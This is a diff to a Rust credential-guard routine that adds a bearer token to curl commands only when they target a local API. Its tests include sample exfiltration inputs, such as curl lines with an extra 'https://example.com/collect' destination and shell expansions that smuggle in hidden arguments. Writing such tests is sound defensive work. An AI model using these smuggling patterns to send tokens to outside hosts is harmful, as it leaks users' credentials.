@@ -246,7 +246,11 @@ fn is_local_api_url(url: &str) -> bool {
 /// command. A separator inside a quoted argument (for example
 /// `"http://localhost:18800/api/x;v=1"`) does not end the command, so a later
 /// destination in the same curl stays visible to the destination check.
-fn command_portion(segment: &str) -> &str {
+///
+/// `in_backticks` marks an invocation that starts right after a backtick (a
+/// `` `curl ...` `` command substitution or markdown inline code); the next
+/// unquoted backtick closes it, exactly as the shell would.
+fn command_portion(segment: &str, in_backticks: bool) -> &str {
     let bytes = segment.as_bytes();
     let mut quote: Option<u8> = None;
     let mut index = 0;
@@ -264,6 +268,7 @@ fn command_portion(segment: &str) -> &str {
                 b'\'' | b'"' => quote = Some(byte),
                 b'\\' => index += 1,
                 b';' | b'|' => return &segment[..index],
+                b'`' if in_backticks => return &segment[..index],
                 b'&' if bytes.get(index + 1) == Some(&b'&') => return &segment[..index],
                 _ => {}
             },
@@ -274,13 +279,24 @@ fn command_portion(segment: &str) -> &str {
     segment
 }
 
+/// One shell word plus whether it contains a parameter or command expansion
+/// (`$` or a backtick), and whether any of that expansion is unquoted. An
+/// unquoted expansion is word-split by the shell and can add arguments (and so
+/// destinations) that the literal text does not show.
+#[derive(Debug, Default, PartialEq)]
+struct ShellWord {
+    text: String,
+    expansion: bool,
+    unquoted_expansion: bool,
+}
+
 /// Split a curl command's argument text the way a POSIX shell would: whitespace
 /// separates words, single quotes are literal, double quotes honour `\`
-/// escapes, and `\` + newline is a line continuation. An unterminated quote
-/// (a multi-line `-d '{...` body) yields its partial last word and `true`.
-fn shell_words(text: &str) -> (Vec<String>, bool) {
+/// escapes, and `\` + newline is a line continuation. The flag is `true` when
+/// the text ends inside an open quote (an incomplete command).
+fn shell_words(text: &str) -> (Vec<ShellWord>, bool) {
     let mut words = Vec::new();
-    let mut current = String::new();
+    let mut current = ShellWord::default();
     let mut in_word = false;
     let mut chars = text.chars().peekable();
     while let Some(ch) = chars.next() {
@@ -290,7 +306,7 @@ fn shell_words(text: &str) -> (Vec<String>, bool) {
                 loop {
                     match chars.next() {
                         Some('\'') => break,
-                        Some(other) => current.push(other),
+                        Some(other) => current.text.push(other),
                         None => {
                             words.push(current);
                             return (words, true);
@@ -305,17 +321,21 @@ fn shell_words(text: &str) -> (Vec<String>, bool) {
                         Some('"') => break,
                         Some('\\') => match chars.next() {
                             Some('\n') => {}
-                            Some(escaped @ ('"' | '\\' | '$' | '`')) => current.push(escaped),
+                            Some(escaped @ ('"' | '\\' | '$' | '`')) => current.text.push(escaped),
                             Some(other) => {
-                                current.push('\\');
-                                current.push(other);
+                                current.text.push('\\');
+                                current.text.push(other);
                             }
                             None => {
                                 words.push(current);
                                 return (words, true);
                             }
                         },
-                        Some(other) => current.push(other),
+                        Some(other @ ('$' | '`')) => {
+                            current.expansion = true;
+                            current.text.push(other);
+                        }
+                        Some(other) => current.text.push(other),
                         None => {
                             words.push(current);
                             return (words, true);
@@ -327,7 +347,7 @@ fn shell_words(text: &str) -> (Vec<String>, bool) {
                 Some('\n') | None => {}
                 Some(other) => {
                     in_word = true;
-                    current.push(other);
+                    current.text.push(other);
                 }
             },
             ch if ch.is_whitespace() => {
@@ -337,8 +357,12 @@ fn shell_words(text: &str) -> (Vec<String>, bool) {
                 }
             }
             other => {
+                if matches!(other, '$' | '`') {
+                    current.expansion = true;
+                    current.unquoted_expansion = true;
+                }
                 in_word = true;
-                current.push(other);
+                current.text.push(other);
             }
         }
     }
@@ -368,51 +392,49 @@ const CURL_LONG_FLAGS: &[&str] = &[
 const CURL_SHORT_FLAGS: &str = "fsSLikINvGgZ0123456#";
 
 /// Whether a curl invocation's arguments request only this instance's API.
-/// Every positional argument (and every `--url` value) must be a local API URL,
-/// and there must be at least one. Options that can redirect or add requests
-/// (`-x/--proxy`, `-K/--config`, `--resolve`, `--connect-to`, `--next`, ...)
-/// and any option not listed above fail closed. An unterminated quote is
-/// accepted only as the value of a value-taking option (a multi-line `-d` body
-/// that continues past the block); anywhere else it fails closed.
+/// Every positional argument (and every `--url` value) must be a literal local
+/// API URL, and there must be at least one. Fails closed on: options that can
+/// redirect or add requests (`-x/--proxy`, `-K/--config`, `--next`, ...) or are
+/// not listed above; any unquoted `$`/backtick expansion (word splitting can add
+/// arguments); any expansion inside a destination; and an incomplete command
+/// (unterminated quote).
 fn targets_local_api(segment: &str) -> bool {
     let (words, unterminated) = shell_words(segment);
-    let last = words.len().saturating_sub(1);
+    if unterminated || words.iter().any(|word| word.unquoted_expansion) {
+        return false;
+    }
+    let is_destination = |word: &ShellWord| !word.expansion && is_local_api_url(&word.text);
     let mut destinations = 0;
-    let mut words = words.into_iter().enumerate();
-    // Option values are consumed here and never reach the last-word check.
-    let next_value = |words: &mut std::iter::Enumerate<std::vec::IntoIter<String>>| {
-        words.next().map(|(_, word)| word)
-    };
-    while let Some((index, word)) = words.next() {
-        if unterminated && index == last {
-            // The open-quoted last word was not consumed as an option value.
-            return false;
-        }
-        if let Some(long) = word.strip_prefix("--") {
+    let mut words = words.into_iter();
+    while let Some(word) = words.next() {
+        if let Some(long) = word.text.strip_prefix("--") {
             let (name, attached) = match long.split_once('=') {
-                Some((name, value)) => (name, Some(value.to_string())),
-                None => (long, None),
+                Some((name, value)) => (name.to_string(), Some(value.to_string())),
+                None => (long.to_string(), None),
             };
             if name == "url" {
-                let Some(url) = attached.or_else(|| next_value(&mut words)) else {
-                    return false;
+                let ok = match attached {
+                    Some(value) => !word.expansion && is_local_api_url(&value),
+                    None => words.next().is_some_and(|value| is_destination(&value)),
                 };
-                if !is_local_api_url(&url) {
+                if !ok {
                     return false;
                 }
                 destinations += 1;
-            } else if CURL_LONG_WITH_VALUE.contains(&name) {
-                if attached.is_none() && next_value(&mut words).is_none() {
+            } else if CURL_LONG_WITH_VALUE.contains(&name.as_str()) {
+                if attached.is_none() && words.next().is_none() {
                     return false;
                 }
-            } else if !(CURL_LONG_FLAGS.contains(&name) && attached.is_none()) {
+            } else if !(CURL_LONG_FLAGS.contains(&name.as_str()) && attached.is_none()) {
                 return false;
             }
-        } else if let Some(cluster) = word.strip_prefix('-').filter(|cluster| !cluster.is_empty()) {
+        } else if let Some(cluster) =
+            word.text.strip_prefix('-').filter(|cluster| !cluster.is_empty())
+        {
             for (offset, letter) in cluster.char_indices() {
                 if CURL_SHORT_WITH_VALUE.contains(letter) {
                     let attached = &cluster[offset + letter.len_utf8()..];
-                    if attached.is_empty() && next_value(&mut words).is_none() {
+                    if attached.is_empty() && words.next().is_none() {
                         return false;
                     }
                     break;
@@ -422,7 +444,7 @@ fn targets_local_api(segment: &str) -> bool {
                 }
             }
         } else {
-            if !is_local_api_url(&word) {
+            if !is_destination(&word) {
                 return false;
             }
             destinations += 1;
@@ -494,19 +516,25 @@ pub fn authorize_api_commands(content: &str) -> String {
     let mut injected = false;
     let mut index = 0;
     while index < lines.len() {
+        // A block is a line plus its `\\` continuations and, once a curl has
+        // started, every line up to the close of a quote opened inside it (a
+        // multi-line `-d '{...}'` body). Prose apostrophes before any curl never
+        // extend a block.
         let mut end = index;
-        while end + 1 < lines.len() && lines[end].trim_end().ends_with('\\') {
-            end += 1;
-        }
         let mut quote = None;
-        let invocations: Vec<(usize, usize)> = (index..=end)
-            .flat_map(|line| {
-                curl_executable_ends(&lines[line], &mut quote)
-                    .into_iter()
-                    .map(move |position| (line, position))
-                    .collect::<Vec<_>>()
-            })
-            .collect();
+        let mut invocations: Vec<(usize, usize)> = Vec::new();
+        loop {
+            for position in curl_executable_ends(&lines[end], &mut quote) {
+                invocations.push((end, position));
+            }
+            let continues = lines[end].trim_end().ends_with('\\')
+                || (quote.is_some() && !invocations.is_empty());
+            if continues && end + 1 < lines.len() {
+                end += 1;
+            } else {
+                break;
+            }
+        }
         let mut inserts = Vec::new();
         for (k, &(line, position)) in invocations.iter().enumerate() {
             let (stop_line, stop_position) = invocations
@@ -523,7 +551,10 @@ pub fn authorize_api_commands(content: &str) -> String {
                 }
                 segment.push_str(&text[from..to.max(from)]);
             }
-            let segment = command_portion(&segment);
+            let executable = if lines[line][..position].ends_with(".exe") { 8 } else { 4 };
+            let in_backticks = position > executable
+                && lines[line].as_bytes()[position - executable - 1] == b'`';
+            let segment = command_portion(&segment, in_backticks);
             if targets_local_api(segment) && !segment.contains("Authorization: Bearer") {
                 inserts.push((line, position));
             }
@@ -738,14 +769,14 @@ curl -s https://example.com/a \\\n  -o out && curl -s \\\n  http://127.0.0.1:188
         ] {
             assert_eq!(authorize_api_commands(source), source, "{source}");
         }
-        // An open quote is accepted only as an option value.
+        // An incomplete command (open quote at the end) never gets the header.
         assert_eq!(
             authorize_api_commands("curl http://localhost:18800/api/x 'evil.example/"),
             "curl http://localhost:18800/api/x 'evil.example/"
         );
         // Option values are not destinations.
         for source in [
-            "curl -X POST \"http://localhost:18800/api/sessions/s/planners\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"domain\": \"frontend\"",
+            "curl -X POST \"http://localhost:18800/api/sessions/s/planners\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"domain\": \"frontend\"\n  }'",
             "curl -fsS -X POST \"http://localhost:18800/api/sessions/s/heartbeat\" -H \"Content-Type: application/json\" -H \"X-Hive-Agent-Token: $HIVE_AGENT_TOKEN\" --data-binary @-",
             "curl -sS -o NUL -w '%{http_code}' -d '{\"a\":\"evil.example/x; y\"}' http://127.0.0.1:18800/api/x",
             "curl -XPOST --url=http://localhost:18800/api/x",
@@ -780,12 +811,47 @@ curl -s https://example.com/a \\\n  -o out && curl -s \\\n  http://127.0.0.1:188
     }
 
     #[test]
+    fn expansions_that_can_add_destinations_fail_closed() {
+        for source in [
+            "TAIL='x https://example.com/collect'\ncurl http://localhost:18800/api/$TAIL",
+            "curl http://localhost:18800/api/x $EXTRA",
+            "curl \"$URL\"",
+            "curl http://localhost:18800/api/x -d $BODY",
+            "curl http://localhost:18800/api/`echo x`",
+            "curl --url \"http://localhost:18800/api/$X\"",
+        ] {
+            assert_eq!(authorize_api_commands(source), source, "{source}");
+        }
+        // A double-quoted expansion inside an option value is not split.
+        let rendered = authorize_api_commands(
+            "curl -H \"X-Hive-Agent-Token: $HIVE_AGENT_TOKEN\" http://localhost:18800/api/x",
+        );
+        assert!(rendered.contains("Bearer $HIVE_API_TOKEN"), "{rendered}");
+    }
+
+    #[test]
+    fn multiline_quoted_bodies_are_validated_through_the_closing_quote() {
+        let leak = "curl http://localhost:18800/api/x -d '{\n}' https://example.com/collect";
+        assert_eq!(authorize_api_commands(leak), leak);
+        let local = "curl http://localhost:18800/api/x -d '{\n  \"a\": 1\n}'\nnext line";
+        let rendered = authorize_api_commands(local);
+        assert!(rendered.starts_with("curl -H \"Authorization: Bearer $HIVE_API_TOKEN\" http://"), "{rendered}");
+        // Prose apostrophes before any curl do not swallow later lines.
+        let prose = "Don't forget:\ncurl -s http://localhost:18800/api/x";
+        assert!(authorize_api_commands(prose).contains("curl -H \"Authorization"));
+    }
+
+    #[test]
     fn shell_words_follow_posix_quoting() {
         assert_eq!(
-            shell_words("-H \"a b\" 'c d' e\\ f \\\n g"),
-            (vec!["-H", "a b", "c d", "e f", "g"].into_iter().map(String::from).collect(), false)
+            shell_words("-H \"a b\" 'c d' e\\ f \\\n g")
+                .0
+                .into_iter()
+                .map(|word| word.text)
+                .collect::<Vec<_>>(),
+            vec!["-H", "a b", "c d", "e f", "g"]
         );
-        assert_eq!(shell_words("'unterminated"), (vec!["unterminated".to_string()], true));
+        assert!(shell_words("'unterminated").1);
     }
 
     #[test]
@@ -801,8 +867,9 @@ curl -s https://example.com/a \\\n  -o out && curl -s \\\n  http://127.0.0.1:188
         // A quoted separator inside a local-only invocation still authorizes it.
         let rendered = authorize_api_commands("curl -s \"http://localhost:18800/api/sessions;v=1\" && echo done");
         assert!(rendered.contains("Bearer $HIVE_API_TOKEN"), "{rendered}");
-        assert_eq!(command_portion("curl \"a;b\" c; d"), "curl \"a;b\" c");
-        assert_eq!(command_portion("curl 'a|b' && d"), "curl 'a|b' ");
+        assert_eq!(command_portion("curl \"a;b\" c; d", false), "curl \"a;b\" c");
+        assert_eq!(command_portion("curl 'a|b' && d", false), "curl 'a|b' ");
+        assert_eq!(command_portion(" -s x` rest", true), " -s x");
     }
 
     #[test]
